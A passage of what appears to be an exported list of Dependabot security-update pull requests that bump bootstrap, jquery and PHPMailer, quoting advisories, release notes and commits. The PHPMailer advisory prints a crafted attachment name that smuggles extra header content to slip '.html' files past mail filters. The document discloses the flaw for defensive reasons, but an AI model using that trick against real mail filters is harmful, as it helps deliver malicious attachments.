<p><strong>Moderate severity vulnerability that affects bootstrap</strong>
In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.</p>
<p>Affected versions: &lt; 4.1.2</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap 3.x before 3.4.0 and 4.x-beta before 4.0.0-beta.2, XSS is possible in the data-target attribute. Note that this is a different vulnerability than CVE-2018-14041.</p>
<p>See <a href=""https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"">https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/</a> for more info.</p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap before 3.4.0, XSS is possible in the tooltip data-viewport attribute.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap before 3.4.0, XSS is possible in the affix configuration target property.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap and bootstrap-sass</strong>
In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: <a href=""https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"">https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/</a></p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap/releases"">bootstrap's releases</a>.</em></p>
<blockquote>
<h2>v4.1.2</h2>
<ul>
<li>Fixed an XSS vulnerability in tooltip, collapse, and scrollspy plugins</li>
<li>Improved how we query elements in our JavaScript plugins</li>
<li>Inline SVGs now have the same vertical alignment as images</li>
<li>Fixed issues with double transitions on carousels</li>
<li>Added Edge and IE10-11 fallbacks to our floating labels example</li>
<li>Various improvements to form controls, including disabled states on file inputs and unified focus styles for selects</li>
</ul>
<p>Checkout the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/26423"">v4.1.2 ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/14"">GitHub project</a> for the full details.</p>
<h2>v4.1.1</h2>
<p><strong>Our first patch release for Bootstrap 4!</strong> Here's a quick rundown of some of the changes:</p>
<ul>
<li>Added validation styles for file inputs</li>
<li>Improved printing of dark tables</li>
<li>Suppressed that <code>text-hide</code> deprecation notice by default</li>
<li>Cleaned up some JS globals and improve coverage</li>
<li>Bumped dependencies, namely Jekyll</li>
<li>Fixed docs issue with incorrect name for our monospace font utility</li>
</ul>
<p>Checkout the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/25971"">v4.1.1 ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/13"">GitHub project</a> for the full details.</p>
<h2>v4.1.0</h2>
<ul>
<li>Added new custom range form control.</li>
<li>Added new <code>.carousel-fade</code> modifier to switch carousel from horizontal sliding to crossfade.</li>
<li>Added new <code>.dropdown-item-text</code> for plaintext dropdown items.</li>
<li>Added new <code>.flex-fill</code>, <code>.flex-grow-*</code>, and <code>.flex-shrink-*</code> utilities.</li>
<li>Added new <code>.table-borderless</code> variant for tables.</li>
<li>Added new <code>.text-monospace</code> utility.</li>
<li>Added new <code>.text-body</code> (default body color), <code>.text-black-50</code> (50% opacity black), and <code>.text-white-50</code> (50% opacity white) utilities.</li>
<li>Added new <code>.shadow-*</code> utilities for quickly adding <code>box-shadow</code>s.</li>
<li>Added ability to disable Popper's positioning in dropdowns.</li>
<li>Fixed longstanding issue with Chrome incorrectly rendering cards across CSS columns.</li>
<li>Deprecated <code>.text-hide</code>â€”you'll see a warning during compilationâ€”as it's a dated and undocumented feature.</li>
<li>Fixed up Dashboard and Offcanvas examples across Firefox and IE.</li>
<li>Breadcrumbs can now use non-string values as dividers.</li>
<li>Updated our Theming docs to confirm you <em>cannot</em> use CSS variables in media queries (sorry folks!).</li>
</ul>
<p>Be sure to look at the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/25375"">ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/5"">project board</a> for more details on all our fixes.</p>
<h2>v4.0.0</h2>
<p>Our first stable v4 release! ðŸŽ‰</p>
<h3>Highlights:</h3>
<ul>
<li>Brand new examples and overhauls for existing ones.</li>
<li>Additional border utilities have been added and the default <code>border-color</code> for them darkened from <code>$gray-200</code> to <code>$gray-300</code>.</li>
<li>Pagination focus styles now match button and input focus state.</li>
<li>Added responsive <code>.order-0</code> classes to reset column order.</li>
<li>Improved examples of form validation documentation by adding tooltip examples and more.</li>
<li>New documentation added for using our CSS variables to the <a href=""https://getbootstrap.com/docs/4.0/getting-started/theming/"">Theming page</a>.</li>
</ul>
</tr></table> ... (truncated)
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/twbs/bootstrap/commit/1f46337a89ed21c94a7c37bc0c0e14a71fef7d97""><code>1f46337</code></a> Update README.md</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/c4ccfbe04e888f3623d74963ba72d2320da0785a""><code>c4ccfbe</code></a> Ship v4.1.2</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/a49f5cab6fb2e106113e5ab59fdcecc7f9349301""><code>a49f5ca</code></a> Clean up npm scripts a bit more.</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/6589408a4b91c0f58fa4ac1508d69e3e9e4345e1""><code>6589408</code></a> Update scripts.</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/de7bef881e9431df4b75cd08968351f4fa1ffaa0""><code>de7bef8</code></a> update card columns docs to make copy more accurate</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/5a11ba5d6b5e07ff4f0bb241171d1a1752c1c375""><code>5a11ba5</code></a> clarify docs dev and add 4.0 link</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/aedd7007682ef39feefce2aea1e4ddba5637cf04""><code>aedd700</code></a> change dist to only affect main since docs css isn't distributed</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/4518288c7ceb92aa8f1b61a383bc75d6c90017d1""><code>4518288</code></a> Move copy tasks back to css-main and js-compile so docs-github task runs prop...</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/159aebc27461553e2ad9ff26a3922eff2d392a34""><code>159aebc</code></a> Update watch scripts to properly copy JS files</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/01f568d9a5c60b3bd7c85c409247e117dd11df9f""><code>01f568d</code></a> fixes <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/26637"">#26637</a></li>
<li>Additional commits viewable in <a href=""https://github.com/twbs/bootstrap/compare/v3.3.7...v4.1.2"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=bootstrap&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=4.1.2)](https://dependabot.com/compatibility-score/?dependency-name=bootstrap&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=4.1.2)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,609405888,"[Security] Bump jquery from 3.3.1 to 3.5.0","Bumps [jquery](https://github.com/jquery/jquery) from 3.3.1 to 3.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-gxr4-xjj5-5px2"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potential XSS vulnerability in jQuery</strong></p>
<h3>Impact</h3>
<p>Passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. <code>.html()</code>, <code>.append()</code>, and others) may execute untrusted code.</p>
<h3>Patches</h3>
<p>This problem is patched in jQuery 3.5.0.</p>
<h3>Workarounds</h3>
<p>To workaround the issue without upgrading, adding the following to your code:</p>
<pre lang=""js""><code>jQuery.htmlPrefilter = function( html ) {
	return html;
};
</code></pre>
<p>You need to use at least jQuery 1.12/2.2 or newer to be able to apply this workaround.</p>
<h3>References</h3>
<p><a href=""https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/"">https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/</a>
<a href=""https://jquery.com/upgrade-guide/3.5/"">https://jquery.com/upgrade-guide/3.5/</a></p>
</tr></table> ... (truncated)
<p>Affected versions: &gt;= 1.2 &lt; 3.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jpcq-cgw6-v4j6"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potential XSS vulnerability in jQuery</strong>
In jQuery versions greater than or equal to 1.0.3 and before 3.5.0, passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code.</p>
<p>This problem is patched in jQuery 3.5.0.</p>
<p>Affected versions: &gt;= 1.0.3 &lt; 3.5.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects jquery</strong>
A prototype pollution vulnerability exists in jQuery versions &lt; 3.4.0 that allows an attacker to inject properties on Object.prototype.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects jquery</strong>
jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution. If an unsanitized source object contained an enumerable <strong>proto</strong> property, it could extend the native Object.prototype.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/jquery/jquery/commit/7a0a850f3d41c0412609c1d32b1e602d4afe2f4e""><code>7a0a850</code></a> 3.5.0</li>
<li><a href=""https://github.com/jquery/jquery/commit/8570a08f6689223aa06ca8cc51d488c6d81d44f9""><code>8570a08</code></a> Release: Update AUTHORS.txt</li>
<li><a href=""https://github.com/jquery/jquery/commit/da3dd85b63c4e3a6a768132c2a83a1a6eec24840""><code>da3dd85</code></a> Ajax: Do not execute scripts for unsuccessful HTTP responses</li>
<li><a href=""https://github.com/jquery/jquery/commit/065143c2e93512eb0c82d1b344b71d06eb7cf01c""><code>065143c</code></a> Ajax: Overwrite s.contentType with content-type header value, if any</li>
<li><a href=""https://github.com/jquery/jquery/commit/1a4f10ddc37c34c6dc3a451ee451b5c6cf367399""><code>1a4f10d</code></a> Tests: Blacklist one focusin test in IE</li>
<li><a href=""https://github.com/jquery/jquery/commit/9e15d6b469556eccfa607c5ecf53b20c84529125""><code>9e15d6b</code></a> Event: Use only one focusin/out handler per matching window &amp; document</li>
<li><a href=""https://github.com/jquery/jquery/commit/966a70909019aa09632c87c0002c522fa4a1e30e""><code>966a709</code></a> Manipulation: Skip the select wrapper for &lt;option&gt; outside of IE 9</li>
<li><a href=""https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77""><code>1d61fd9</code></a> Manipulation: Make jQuery.htmlPrefilter an identity function</li>
<li><a href=""https://github.com/jquery/jquery/commit/04bf577e2f961c9dde85ddadc77f71bc7bc671cc""><code>04bf577</code></a> Selector: Update Sizzle from 2.3.4 to 2.3.5</li>
<li><a href=""https://github.com/jquery/jquery/commit/7506c9ca62a2f3ef773e19385918c31e9d62d412""><code>7506c9c</code></a> Build: Resolve Travis config warnings</li>
<li>Additional commits viewable in <a href=""https://github.com/jquery/jquery/compare/3.3.1...3.5.0"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~mgol"">mgol</a>, a new releaser for jquery since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=jquery&package-manager=npm_and_yarn&previous-version=3.3.1&new-version=3.5.0)](https://dependabot.com/compatibility-score/?dependency-name=jquery&package-manager=npm_and_yarn&previous-version=3.3.1&new-version=3.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,922949324,"[Security] Bump phpmailer/phpmailer from 5.2.28 to 6.5.0","Bumps [phpmailer/phpmailer](https://github.com/PHPMailer/PHPMailer) from 5.2.28 to 6.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-3603.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Untrusted code may be run from an overridden address validator</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-34551.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>RCE affecting Windows hosts via UNC paths to translation files</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-f7hx-fqxw-rvvj"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Insufficient output escaping of attachment names in PHPMailer</strong></p>
<h3>Impact</h3>
<p>CWE-116: Incorrect output escaping.</p>
<p>An attachment added like this (note the double quote within the attachment name, which is entirely valid):</p>
<pre><code>$mail-&amp;gt;addAttachment('/tmp/attachment.tmp', 'filename.html&quot;;.jpg');
</code></pre>
<p>Will result in a message containing these headers:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html&quot;;.jpg&quot;
Content-Disposition: attachment; filename=&quot;filename.html&quot;;.jpg&quot;
</code></pre>
<p>The attachment will be named <code>filename.html</code>, and the trailing <code>&quot;;.jpg&quot;</code> will be ignored. Mail filters that reject <code>.html</code> attachments but permit <code>.jpg</code> attachments may be fooled by this.</p>
<p>Note that the MIME type itself is obtained automatically from the <em>source filename</em> (in this case <code>attachment.tmp</code>, which maps to a generic <code>application/octet-stream</code> type), and not the <em>name</em> given to the attachment (though these are the same if a separate name is not provided), though it can be set explicitly in other parameters to attachment methods.</p>
<h3>Patches</h3>
<p>Patched in PHPMailer 6.1.6 by escaping double quotes within the name using a backslash, as per RFC822 section 3.4.1, resulting in correctly escaped headers like this:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html\&quot;;.jpg&quot;
</code></pre>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 6.1.6</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/releases"">phpmailer/phpmailer's releases</a>.</em></p>
<blockquote>
<h2>PHPMailer 6.5.0</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<p>Thanks to Vikrant Singh Chauhan, listensec.com, and the WordPress security team for reporting and assistance with this release.</p>
<h2>PHPMailer 6.4.1</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<p>Thanks to Fariskhi Vidyan for the report and assistance, and Tidelift for support.</p>
<h2>PHPMailer 6.4.0</h2>
<p>This is a maintenance release. The changes introduced in 6.3.0 for setting an envelope sender automatically when using <code>mail()</code> caused problems, <a href=""https://core.trac.wordpress.org/ticket/52822"">especially in WordPress</a>, so this change has been reverted. It gets a minor version bump as it's a change in behaviour, but only back to what 6.2.0 did. See <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">#2298</a> for more info.</p>
<p>Other changes:</p>
<ul>
<li>Check for the mbstring extension before decoding addresss in <code>parseAddress</code>, so it won't fail if you don't have it installed</li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in <a href=""https://tidelift.com"">Tidelift</a>, because supporting open-source is important!</li>
</ul>
<h2>PHPMailer 6.3.0</h2>
<p>This is a maintenance release.</p>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>PHPMailer 6.2.0</h2>
<p>This is a maintenance release. With this release, PHPMailer gains official PHP 8 compatibility; earlier versions worked in PHP 8 pre-releases, but the test suite did not. The considerable rework this required (which also restored tests running on older PHP versions) was done by <a href=""https://github.com/jrfnl""><code>@â€‹jrfnl</code></a> â€“ thank you very much!</p>
<ul>
<li>PHP 8.0 compatibility</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md"">phpmailer/phpmailer's changelog</a>.</em></p>
<blockquote>
<h2>Version 6.5.0 (June 16th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<h2>Version 6.4.1 (April 29th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<h2>Version 6.4.0 (March 31st, 2021)</h2>
<ul>
<li>Revert change that made the <code>mail()</code> and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">PHPMailer/PHPMailer#2298</a></li>
<li>Check for mbstring extension before decoding addresss in <code>parseAddress</code></li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in Tidelift</li>
</ul>
<h2>Version 6.3.0 (February 19th, 2021)</h2>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>Version 6.2.0</h2>
<ul>
<li>PHP 8.0 compatibility, many thanks to <a href=""https://github.com/jrf""><code>@â€‹jrf</code></a>_nl!</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
<li>Avoid warnings when using old openssl functions</li>
<li>Improve Travis-CI build configuration</li>
</ul>
<h2>Version 6.1.8 (October 9th, 2020)</h2>
<ul>
<li>Mark <code>ext-hash</code> as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose</li>
<li>Make file upload examples safer</li>
<li>Update links to SMTP testing servers</li>
<li>Avoid errors when set_time_limit is disabled (you need better hosting!)</li>
<li>Allow overriding auth settings for local tests; makes it easy to run tests using HELO</li>
<li>Recover gracefully from errors during keepalive sessions</li>
<li>Add AVIF MIME type mapping</li>
<li>Prevent duplicate <code>To</code> headers in BCC-only messages when using <code>mail()</code></li>
<li>Avoid file function problems when attaching files from Windows UNC paths</li>
<li>Improve German, Bahasa Indonesian, Filipino translations</li>
<li>Add Javascript-based example</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/a5b5c43e50b7fba655f793ad27303cd74c57363c""><code>a5b5c43</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/e121da364fbf25d861f8131e4c742ab875f1444e""><code>e121da3</code></a> Merge branch 'master' of <a href=""https://github.com/PHPMailer/PHPMailer"">https://github.com/PHPMailer/PHPMailer</a></li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/74e512aa750f8f9a2a927161706c5027a3aefb76""><code>74e512a</code></a> Security update</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/acd264bf17ff4ac5c915f0d4226dce8a9ea70bc3""><code>acd264b</code></a> Merge branch 'CVE-2021-34551'</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/0063f83e8ccdd46faa473c541f7dd8ba46ebc37a""><code>0063f83</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/707205f25572332079b8c77c06a26d4ebb54d90f""><code>707205f</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/1047838e84c8ec99c566c9a52336d9dbddd4e333""><code>1047838</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/c2f191be6bd6ba6a62cd899a7cce409da9651a85""><code>c2f191b</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/45f3c18dc6a2de1cb1bf49b9b249a9ee36a5f7f3""><code>45f3c18</code></a> Deny string-based callables altogether</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/6334bab2affb132b1445825a0f1f82f7869b981e""><code>6334bab</code></a> CVE docs</li>
<li>Additional commits viewable in <a href=""https://github.com/PHPMailer/PHPMailer/compare/v5.2.28...v6.5.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=5.2.28&new-version=6.5.0)](https://dependabot.com/compatibility-score/?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=5.2.28&new-version=6.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
